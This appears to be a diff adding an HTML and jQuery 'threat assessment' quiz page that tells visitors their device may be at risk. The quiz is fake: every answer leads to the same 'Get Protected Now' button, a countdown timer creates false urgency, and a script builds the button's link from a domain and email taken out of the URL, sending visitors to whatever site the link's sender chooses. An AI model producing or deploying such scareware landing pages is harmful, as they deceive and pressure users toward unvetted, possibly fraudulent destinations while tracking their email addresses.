@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Assessment Quiz</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <style>
+        body {
+            text-align: center;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .quiz-container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 550px;
+            margin: auto;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        .question {
+            display: none;
+        }
+        .question.active {
+            display: block;
+        }
+        .btn-custom {
+            width: 100%;
+            padding: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #ff4d4d, #b9222f);
+            color: white;
+            border: none;
+            transition: all 0.3s ease-in-out;
+        }
+        .btn-custom:hover {
+            transform: scale(1.05);
+            background: linear-gradient(45deg, #b9222f, #ff4d4d);
+        }
+        .progress-container {
+            width: 100%;
+            background: transparent;
+            height: 8px;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 50%;
+            background: #ff4d4d;
+            transition: width 0.4s ease-in-out;
+        }
+        .cta, .secure-container {
+            display: none;
+            margin-top: 20px;
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 550px;
+            margin: 20px auto;
+            background: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        .secure-container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 550px;
+            margin: auto;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        .secure-container h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .secure-container p {
+            font-size: 18px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        footer {
+            background-color: #d32f2f;
+            color: white;
+            padding: 20px 0;
+            margin-top: 40px;
+            position: relative;
+        }
+        footer p {
+            font-size: 16px;
+            margin: 0;
+        }
+        .countdown {
+            font-size: 36px;
+            font-weight: bold;
+            color: #d12f3b;
+            margin: 20px 0;
+            padding: 10px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin: auto;
+        }
+        @media (min-width: 320px) and (max-width: 620px) {
+            .quiz-container {
+                width: 90% !important;
+            }
+            .countdown {
+                font-size: 30px;
+            }
+            .question .active .mt-2 .mb-2 h4 {
+                line-height: 20px;
+            }
+            .secure-container {
+                width: 90%;
+            }
+        }
+        a {
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header class="text-center p-3">
+        <img src="./img/logo.png" alt="Logo" width="200px">
+    </header>
+    <div class="Container">
+        <h3>Is Your Device Safe from Emerging Cyber Threats?</h3>
+        <p>Take our quick assessment to find out your risk level and secure your device today!</p>
+    </div>
+    <section class="quiz-container mt-4">
+        <div id="countdown" class="countdown">00 : 00 : 00</div>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        <div class="question active mt-2 mb-2" id="q1">
+            <h4>Have you noticed unusual pop-ups recently?</h4>
+            <button class="btn-custom next" data-next="q2">Yes</button>
+            <button class="btn-custom next mt-3" data-next="q2">No</button>
+        </div>
+        <div class="question" id="q2">
+            <h4>Is your device running slower than usual?</h4>
+            <button class="btn-custom next" data-next="q3">Yes</button>
+            <button class="btn-custom next mt-3" data-next="q3">No</button>
+        </div>
+        <div class="question" id="q3">
+            <h4>Would you like advanced protection now?</h4>
+            <button class="btn-custom finish">Yes</button>
+            <button class="btn-custom finish mt-3">No</button>
+        </div>
+    </section>
+    
+    <section class="secure-container d-flex flex-column justify-content-center align-items-center d-none text-center" id="secure-section">
+        <h1>Secure Your Device Now</h1>
+        <p>Don't wait! Protect your device against the latest cyber threats today and stay safe.</p>
+        <a href="#" class="btn-custom go-final">Get Protected Now</a>
+    </section>
+    
+    <footer>
+        <p>&copy; 2025 Threat Assessment. All Rights Reserved.</p>
+    </footer>
+
+    <script>
+        $(document).ready(function() {
+            let totalQuestions = $('.question').length;
+            let progressStep = 100 / totalQuestions;
+            let currentProgress = 0;
+
+            let timeLeft = 27 * 60; // 27 minutes in seconds
+            function updateCountdown() {
+                let minutes = Math.floor(timeLeft / 60);
+                let seconds = timeLeft % 60;
+                $("#countdown").text(
+                    (minutes < 10 ? "0" : "") + minutes + " : " +
+                    (seconds < 10 ? "0" : "") + seconds
+                );
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    setTimeout(updateCountdown, 1000);
+                } else {
+                    $(".quiz-container").hide();
+                    $("#secure-section").removeClass("d-none").fadeIn();
+                }
+            }
+            updateCountdown();
+
+            $(".next").click(function() {
+                let nextId = $(this).data("next");
+                $(this).closest(".question").removeClass("active").hide();
+                $("#" + nextId).addClass("active").show();
+                currentProgress += progressStep;
+                $("#progress").css("width", currentProgress + "%");
+            });
+
+            $(".finish").click(function() {
+                $(".quiz-container").hide();
+                $("#secure-section").removeClass("d-none").fadeIn();
+            });
+        });
+    </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+    function getURLParameter(name) {
+        return decodeURI(
+            (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || '');
+    }
+
+    // Grab dom URL variable
+    var dom = getURLParameter('dom');
+    var email = getURLParameter('email');
+    var emaildec = decodeURI(email);
+    var realemail = email.replace("%40", "@");
+
+    //build link - insert into HTML
+    // document.write('<a href="'+ link + '" class="**button classes here**" style="display: inline-block;">LOG-IN NOW</a>');
+    var link = "https://" + dom + "/click/1";
+
+    jQuery(document).ready(function (e) {
+        $('.go-final').attr('href', link);
+    });
+</script>
+</body>
+</html>
